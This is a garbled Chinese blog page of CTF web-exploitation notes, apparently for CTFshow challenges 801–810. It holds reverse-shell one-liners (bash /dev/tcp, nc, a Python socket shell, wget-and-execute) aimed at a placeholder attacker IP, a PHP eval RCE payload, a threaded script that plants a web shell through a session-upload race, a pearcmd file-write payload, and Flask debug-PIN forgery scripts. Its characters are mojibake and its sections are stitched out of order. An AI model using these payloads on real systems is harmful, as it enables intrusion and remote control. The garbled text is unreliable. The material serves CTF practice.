<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
<span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
<span class="token function">prev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
<span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
<span class="token function">each</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>æ–‡ä»¶è¯»å–</p>
<p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p>
<pre class="line-numbers language-none"><code class="language-none">var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹
print_r()  åŒä¸Š
scandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨
localeconv()  
getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•
getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>807</strong></p>

        <h3 id="åå¼¹shell"   >
          <a href="#åå¼¹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3>
      <p>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€</p>
<ol>
<li><p>å…¬ç½‘æœåŠ¡å™¨</p>
<p>ç›‘å¬å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">æ”»å‡»ç«¯
nc -lvp ç›‘å¬çš„ç«¯å£
å—å®³ç«¯
bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»ç«¯IP&#x2F;æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0&gt;&amp;1
nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">wget æ”»å‡»ç«¯IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>pythonè„šæœ¬åå¼¹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#-*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"æ”»å‡»ç«¯IP"</span><span class="token punctuation">,</span>æ”»å‡»ç«¯ç›‘å¬ç«¯å£<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>808</strong></p>

        <h3 id="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"   >
          <a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3>
      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> sys
session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess<span class="token operator">=</span><span class="token string">'yu22x'</span>
url1<span class="token operator">=</span><span class="token string">"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/"</span>
url2<span class="token operator">=</span><span class="token string">'http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'</span>
data1<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span>
<span class="token punctuation">&#125;</span>
data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'echo 11123;system("cat /*");'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1'</span>
<span class="token punctuation">&#125;</span>
cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess
<span class="token punctuation">&#125;</span>
<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'11123'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çº¯çº¯çœ‹è¿æ°”</p>
<p><strong>809</strong></p>

        <h3 id="pearæ–‡ä»¶åŒ…å«-RCE"   >
          <a href="#pearæ–‡ä»¶åŒ…å«-RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#pearæ–‡ä»¶åŒ…å«-RCE" class="headerlink" title="pearæ–‡ä»¶åŒ…å«/RCE"></a>pearæ–‡ä»¶åŒ…å«/RCE</h3>
      <p>æ–‡ç« <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" >åœ¨æ­¤</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<blockquote>
<p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p>
<p>åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p>
<p>æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯<code>register_argc_argv</code>è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚</p>
<p>å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†<code>register_argc_argv</code>ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ</p>
<p>HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼</p>
</blockquote>
<p>æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„<code>&lt;?=phpinfo()?&gt;</code>ï¼Œæ–‡ä»¶åŒ…å«å³å¯</p>
<p><strong>810</strong></p>

        <h3 id="SSRFæ‰“PHP-FPM"   >
          <a href="#SSRFæ‰“PHP-FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRFæ‰“PHP-FPM" class="headerlink" title="SSRFæ‰“PHP-FPM"></a>SSRFæ‰“PHP-FPM</h3>
      <p>æœ‰å·¥å…·ä¸ç”¨***</p>
<pre class="line-numbers language-none"><code class="language-none">title: CTFshowå¸¸ç”¨å§¿åŠ¿
date: 2022-06-04 16:20:22
tags:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>801</strong></p>

        <h3 id="flaskè®¡ç®—PIN-1"   >
          <a href="#flaskè®¡ç®—PIN-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#flaskè®¡ç®—PIN-1" class="headerlink" title="flaskè®¡ç®—PIN"></a>flaskè®¡ç®—PIN</h3>
      <p><strong>ä»€ä¹ˆæ˜¯PINç </strong></p>
<p>PINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼</p>
<p><strong>æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ</strong></p>
<p><strong>ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</strong></p>
<p>é¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨
PIN_TIME &#x3D; 60 * 60 * 24 * 7


def hash_pin(pin: str) -&gt; str:
    return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]


_machine_id: t.Optional[t.Union[str, bytes]] &#x3D; None

#è·å–æœºå™¨å·
def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:
        linux &#x3D; b&quot;&quot;

        # machine-id is stable across boots, boot_id is not.
        for filename in &quot;&#x2F;etc&#x2F;machine-id&quot;, &quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;:
            try:
                with open(filename, &quot;rb&quot;) as f:
                    value &#x3D; f.readline().strip()
            except OSError:
                continue

            if value:
            #è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥
                linux +&#x3D; value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;, &quot;rb&quot;) as f:
            #ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦&#x2F;dockeråçš„ä¸œè¥¿
                linux +&#x3D; f.readline().strip().rpartition(b&quot;&#x2F;&quot;)[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer&#39;s serial number.
        try:
            # subprocess may not be available, e.g. Google App Engine
            # https:&#x2F;&#x2F;github.com&#x2F;pallets&#x2F;werkzeug&#x2F;issues&#x2F;925
            from subprocess import Popen, PIPE

            dump &#x3D; Popen(
                [&quot;ioreg&quot;, &quot;-c&quot;, &quot;IOPlatformExpertDevice&quot;, &quot;-d&quot;, &quot;2&quot;], stdout&#x3D;PIPE
            ).communicate()[0]
            match &#x3D; re.search(b&#39;&quot;serial-number&quot; &#x3D; &lt;([^&gt;]+)&#39;, dump)

            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows, use winreg to get the machine guid.
        if sys.platform &#x3D;&#x3D; &quot;win32&quot;:
            import winreg

            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    &quot;SOFTWARE\\Microsoft\\Cryptography&quot;,
                    0,
                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
                ) as rk:
                    guid: t.Union[str, bytes]
                    guid_type: int
                    guid, guid_type &#x3D; winreg.QueryValueEx(rk, &quot;MachineGuid&quot;)

                    if guid_type &#x3D;&#x3D; winreg.REG_SZ:
                        return guid.encode(&quot;utf-8&quot;)

                    return guid
            except OSError:
                pass

        return None

    _machine_id &#x3D; _generate()
    return _machine_id


class _ConsoleFrame:
    &quot;&quot;&quot;Helper class so that we can reuse the frame console code for the
    standalone console.
    &quot;&quot;&quot;

    def __init__(self, namespace: t.Dict[str, t.Any]):
        self.console &#x3D; Console(namespace)
        self.id &#x3D; 0


def get_pin_and_cookie_name(
    app: &quot;WSGIApplication&quot;,
) -&gt; t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    &quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns &#96;None&#96;.

    Second item in the resulting tuple is the cookie name for remembering.
    &quot;&quot;&quot;
    pin &#x3D; os.environ.get(&quot;WERKZEUG_DEBUG_PIN&quot;)
    rv &#x3D; None
    num &#x3D; None

    # Pin was explicitly disabled
    if pin &#x3D;&#x3D; &quot;off&quot;:
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace(&quot;-&quot;, &quot;&quot;).isdigit():
        # If there are separators in the pin, return it directly
        if &quot;-&quot; in pin:
            rv &#x3D; pin
        else:
            num &#x3D; pin

    modname &#x3D; getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username &#x3D; getpass.getuser()
    except (ImportError, KeyError):
        username &#x3D; None

    mod &#x3D; sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits &#x3D; [
        username,
        modname,
        getattr(app, &quot;__name__&quot;, type(app).__name__),
        getattr(mod, &quot;__file__&quot;, None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits &#x3D; [str(uuid.getnode()), get_machine_id()]

    h &#x3D; hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit &#x3D; bit.encode(&quot;utf-8&quot;)
        h.update(bit)
    h.update(b&quot;cookiesalt&quot;)

    cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;

    # If we need to generate a pin we salt it a bit more so that we don&#39;t
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b&quot;pinsalt&quot;)
        num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don&#39;t have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size &#x3D;&#x3D; 0:
                rv &#x3D; &quot;-&quot;.join(
                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv &#x3D; num

    return rv, cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰</p>
<ul>
<li>usernameï¼Œç”¨æˆ·å</li>
<li>modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app</li>
<li>appnameï¼Œé»˜è®¤å€¼ä¸ºFlask</li>
<li>moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li>
<li>uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</li>
<li>machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid</li>
</ul>
<p>é¦–å…ˆæ˜¯ç”¨æˆ·å</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png" alt="img"></p>
<p>å¯ç”¨çš„ä¼¼ä¹åªæœ‰root</p>
<p>ä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—</p>
<p>macåœ°å€</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png" alt="img"></p>
<p>Machine_id</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png" alt="img"></p>
<p>æœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">#MD5
import hashlib
from itertools import chain
probably_public_bits &#x3D; [
     &#39;flaskweb&#39;# username
     &#39;flask.app&#39;,# modname
     &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
     &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
]

private_bits &#x3D; [
     &#39;25214234362297&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address
     &#39;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id
]

h &#x3D; hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit &#x3D; bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)

cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]

num &#x3D; None
if num is None:
   h.update(b&#39;pinsalt&#39;)
   num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]

rv &#x3D;None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size &#x3D;&#x3D; 0:
          rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                      for x in range(0, len(num), group_size))
          break
       else:
          rv &#x3D; num

print(rv)
#sha1
import hashlib
from itertools import chain
probably_public_bits &#x3D; [
    &#39;root&#39;# &#x2F;etc&#x2F;passwd
    &#39;flask.app&#39;,# é»˜è®¤å€¼
    &#39;Flask&#39;,# é»˜è®¤å€¼
    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # æŠ¥é”™å¾—åˆ°
]

private_bits &#x3D; [
    &#39;2485377581187&#39;,#  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16è¿›åˆ¶è½¬10è¿›åˆ¶
    #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup
    &#39;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#39;#  &#x2F;proc&#x2F;self&#x2F;cgroup
]

h &#x3D; hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit &#x3D; bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)

cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]

num &#x3D; None
if num is None:
    h.update(b&#39;pinsalt&#39;)
    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]

rv &#x3D;None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size &#x3D;&#x3D; 0:
            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv &#x3D; num

